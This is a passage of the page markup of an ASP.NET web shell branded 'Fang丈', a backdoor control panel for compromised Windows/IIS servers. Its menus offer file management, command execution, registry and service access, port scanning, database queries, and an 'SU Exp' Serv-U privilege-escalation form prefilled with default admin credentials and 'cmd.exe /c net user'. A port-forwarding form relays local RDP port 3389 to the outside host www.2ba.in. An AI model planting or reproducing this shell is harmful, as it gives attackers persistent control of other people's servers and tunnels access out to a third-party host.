        ...
        <div id="ZVS" runat="server">
            <div id="Zzj" runat="server">
                <table width="100%" border="0" cellpadding="0" cellspacing="0">
                    <tr class="head">
                        <td><span style="float: right;"><a href="http://www.2ba.in" target="_blank">Fang丈 QQ:2521256468</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
                    </tr>
                    <tr class="alt1">
                        <td><span style="float: right;" id="Bin_Span_FrameVersion" runat="server"></span>
                            <asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="Logout"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="RsqhW" runat="server" Text="文件管理器" OnClick="Ybg"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="xxzE" runat="server" Text="执行命令" OnClick="VOxn"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="nuc" runat="server" Text="IIS侦探" OnClick="KjPi"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="OREpx" runat="server" Text="进程" OnClick="Grxk"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="jHN" runat="server" Text="服务" OnClick="ilC"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="PHq" runat="server" Text="用户信息" OnClick="Olm"></asp:LinkButton>
                            |
                            ...
                            |
                            <asp:LinkButton ID="PVQ" runat="server" Text="SU Exp" OnClick="jXhS"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="jNDb" runat="server" Text="注册表" OnClick="xSy"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="HDQ" runat="server" Text="端口扫描" OnClick="cptS"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="AoI" runat="server" Text="数据库" OnClick="dMx"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="KHbEd" runat="server" Text="端口转发" OnClick="fDO"></asp:LinkButton>
                        </td>
                    </tr>
                </table>
            </div>
                            ...
                            <table width="100%" border="0" cellpadding="4" cellspacing="0">
                                <tr class="alt1">
                                    <td colspan="7" style="padding: 5px;">
                                        ...
                                        | <a href="#" id="Bin_Button_CreateDir" runat="server">创建目录</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">创建文件</a>
                        ...
                        <div runat="server" id="APl">
                            <table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin: 10px 0;">
                                <tr align="center">
                                    ...
                                    <td style="width: 20%" align="left">UserName :
                                        <input class="input" runat="server" id="dNohJ" type="text" size="20" value="localadministrator" /></td>
                                    <td style="width: 20%" align="left">PassWord :
                                        <input class="input" runat="server" id="NMd" type="text" size="20" value="#l@$ak#.lk;0@P" /></td>
                                    <td style="width: 20%" align="left">Port :
                                        <input class="input" runat="server" id="HlQl" type="text" size="20" value="43958" /></td>
                                    <td style="width: 10%"></td>
                                </tr>
                                <tr>
                                    <td style="width: 10%"></td>
                                    <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user" />
                                        <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="Exploit" OnClick="lRfRj" /></td>
                                </tr>
                            </table>
                        ...
                        <div id="iDgmL" runat="server">
                            ...
                            <div id="dQIIF" runat="server">
                                ...
                                <table width="200" border="0" cellpadding="0" cellspacing="0">
                                    ...
                                    <tr>
                                        <td>
                                            <textarea id="jHIy" class="area" style="width: 600px; height: 60px; overflow: auto;" runat="server" rows="6" cols="1"></textarea></td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <asp:Button runat="server" ID="WOhJ" CssClass="bt" Text="Query" OnClick="ORUgV" /></td>
                                    </tr>
                                </table>
                        ...
                        <div id="hOWTm" runat="server">
                            <table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin: 10px 0;">
                                <tr align="center">
                                    ...
                                    <td style="width: 20%" align="left">本地端口 :
                                        <input class="input" runat="server" id="iXdh" type="text" size="20" value="3389" /></td>
                                    <td style="width: 20%" align="left">远程IP :
                                        <input class="input" runat="server" id="llH" type="text" size="20" value="www.2ba.in" /></td>
                                    <td style="width: 20%" align="left">远程端口 :
                                        <input class="input" runat="server" id="ZHS" type="text" size="20" value="80" /></td>
                                </tr>
                                <tr align="center">
                                    <td colspan="5">
                                        <br />
                                        <asp:Button ID="FJE" CssClass="bt" runat="server" Text="端口转发" OnClick="wDZ" />
                                        <asp:Button ID="giX" CssClass="bt" runat="server" Text="全部清除" OnClick="vJNsE" />
                                ...
                                <tr align="center">
                                    ...
                                    <td style="width: 20%" align="left">
                                        <asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list">
                                            <asp:ListItem Value="name">File Name</asp:ListItem>
                                            <asp:ListItem Value="content" Selected="True">File Content</asp:ListItem>
                                        </asp:DropDownList></td>
                                </tr>
                                <tr align="center">
                                    ...
                                    <td style="width: 20%" align="left">
                                        <asp:Button CssClass="bt" ID="axy" runat="server" OnClick="NBy" Text="Start" /></td>
                                </tr>
                            </table>
                            <br />
                            <br />
            ...
            <div style="padding: 10px; border-bottom: 1px solid #fff; border-top: 1px solid #ddd; background: #eee;">Copyright &copy; 2010 <a href="http://www.2ba.in" target="_blank">Fang丈</a> All Rights Reserved.</div>
        </div>
    </form>
</body>
</html>
